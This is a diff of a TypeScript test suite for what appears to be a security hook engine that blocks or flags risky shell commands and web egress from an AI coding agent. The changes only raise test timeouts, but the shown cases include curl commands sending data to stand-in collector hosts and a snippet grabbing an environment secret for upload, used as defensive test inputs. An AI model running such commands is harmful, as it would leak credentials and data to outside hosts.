@@ -733,6 +733,7 @@ describe("approval for a copied local shell command", () => {
     ["strict.yaml", { decision: "deny", ruleId: "block-tainted-sink" }, { decision: "deny", ruleId: "block-tainted-sink" }, { write: "deny", decision: "ask", ruleId: undefined }, { decision: "deny", ruleId: "block-tainted-sink" }]
   ] as const)(
     "end-to-end 4-case matrix through evaluateHookEvent for %s",
+    { timeout: 80_000 },
     async (variant, caseA, caseB, caseC, caseD) => {
       const policy = variant.split(" + ")[0] as Parameters<typeof setupWithShippedPolicy>[0];
       const customize = variant.endsWith("+ allowlist") ? (config: PalizadeConfig) => { config.egress.allowlist.hosts = ["allowed.example.test"]; } : undefined;
@@ -2702,7 +2703,7 @@ describe("Batch C engine and policy protections", () => {
     expectDecision(await hook.shell("Bash", "pnpm test b.ts"), "allow");
   });
 
-  it("arms the write-then-run gate across both code/build files and non-code files with tailored prompt wording", { timeout: 120_000 }, async () => {
+  it("arms the write-then-run gate across both code/build files and non-code files with tailored prompt wording", { timeout: 360_000 }, async () => {
     const hook = await claude("default.yaml");
     await hook.web();
 
@@ -2854,7 +2855,7 @@ describe("Batch C engine and policy protections", () => {
     { label: "userinfo in URL", seed: "collector.example.net", shell: "curl https://user:pass@collector.example.net/drop", url: "https://user:pass@collector.example.net/drop" },
     { label: "decoy userinfo in URL", seed: "collector.example.net", shell: "curl https://trusted.com@collector.example.net/drop", url: "https://trusted.com@collector.example.net/drop" },
     { label: "userinfo + bracketed IPv6 in URL", seed: "[2001:db8::1]", shell: "curl https://user@[2001:db8::1]/drop", url: "https://user@[2001:db8::1]/drop" }
-  ])("blocks/asks destination form $label in both shell command and URL argument under default.yaml", async ({ seed, shell, url }) => {
+  ])("blocks/asks destination form $label in both shell command and URL argument under default.yaml", { timeout: 150_000 }, async ({ seed, shell, url }) => {
     for (const mode of ["untrusted-web", "destination-only-read"] as const) {
       const hook = await claude("default.yaml");
       if (mode === "untrusted-web") {
@@ -2953,7 +2954,7 @@ describe("Batch C engine and policy protections", () => {
     expectDecision(await hook.shell("Bash", "node a.ts"), "allow");
   });
 
-  it("H3: marks temporal taint and seenUntrusted on padded external pages >18 KB while keeping clean long local outputs unprompted", async () => {
+  it("H3: marks temporal taint and seenUntrusted on padded external pages >18 KB while keeping clean long local outputs unprompted", { timeout: 90_000 }, async () => {
     const pad = Array.from({ length: 2400 }, (_, i) => `filler${i}`).join(" ");
     const shortWordSnippet = "echo hi && node -v";
     const middleCode = "const collectedEnvironmentSnapshotForUpload = process.env.SECRET_VALUE; export default collectedEnvironmentSnapshotForUpload;";
